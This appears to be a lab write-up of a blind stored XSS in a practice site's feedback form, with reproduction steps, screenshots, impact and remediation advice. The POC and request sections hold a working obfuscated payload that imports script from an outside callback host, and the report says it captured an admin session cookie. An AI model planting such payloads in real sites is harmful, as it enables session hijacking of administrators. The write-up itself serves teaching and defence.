## Title
Blind XSS - ClientFlow Account Management

## Description
**Affected URL:** https://clientflow.pwnedbox.site/

The ClientFlow feedback form accepts user-controlled input in the Name and Your feedback fields. The submitted feedback is stored and later displayed in the administrative interface.

A Blind XSS vulnerability was identified when the injected payload triggered external callbacks while the submitted feedback was accessed through the admin dashboard. XSS.Report recorded callbacks from `admin/feedback.php?id=1` and `admin/dashboard.php`.

## Steps to Reproduce
1. Open https://clientflow.pwnedbox.site/feedback.php.
2. Enter the XSS payload in the Name and Your feedback fields.
3. Provide a valid email address and submit the feedback.
4. Wait for the submitted feedback to be accessed through the admin dashboard.
5. Check XSS.Report for the callbacks.

## POC (Proof of Concept)
**Lab Address:** https://clientflow.pwnedbox.site/

**HTTP Method:** POST

**Vulnerable Parameters:** Name and Your feedback.

**Payload:**
```html
"><iMaGE/src/onerror=import('//xss.report/c/mihir')>
```

**Request Parameter:**
```text
Name: "><iMaGE/src/onerror=import('//xss.report/c/mihir')>
Your feedback: "><iMaGE/src/onerror=import('//xss.report/c/mihir')>
Email: test@gmail.com
```

**Observed Result:**

The submitted feedback appeared in the administrative dashboard. XSS.Report recorded callbacks from `https://clientflow.pwnedbox.site/admin/feedback.php?id=1` and `https://clientflow.pwnedbox.site/admin/dashboard.php`. The captured report also contained a PHP session cookie value.

**Screenshot Evidence:**
1. Feedback form containing the injected payload.
<img width="1919" height="978" alt="image" src="https://github.com/user-attachments/assets/5a1a276f-9191-4365-b327-790076a2fb67" />

2. Admin dashboard displaying the submitted feedback.
<img width="1919" height="983" alt="image" src="https://github.com/user-attachments/assets/bb3240a9-3683-4076-ae0b-72c778d9b535" />

3. XSS.Report dashboard showing captured callbacks.
<img width="1919" height="976" alt="image" src="https://github.com/user-attachments/assets/33f4cde9-2a7e-4462-81f4-535598eb9b33" />

4. XSS.Report detail page showing the affected admin URL and captured request information.
<img width="1919" height="975" alt="image" src="https://github.com/user-attachments/assets/da2339e1-4c4a-4431-ba51-759a6e239e03" />


## Impact
An attacker can submit malicious feedback that executes JavaScript when an administrator views or processes the submission.

Potential consequences include:
- JavaScript execution in an administrator's browser.
- Exposure of sensitive information accessible to the administrator's browser.
- Potential session hijacking if the captured session cookie is usable.
- Unauthorized actions through the administrator's active session, depending on application protections.

## Remediation
1. Apply context-aware output encoding to all user-submitted fields before displaying them.
2. Never render feedback or user details as raw HTML.
3. Validate and sanitize submitted data on the server side.
4. Set session cookies with `HttpOnly`, `Secure`, and appropriate `SameSite` attributes to reduce session exposure.
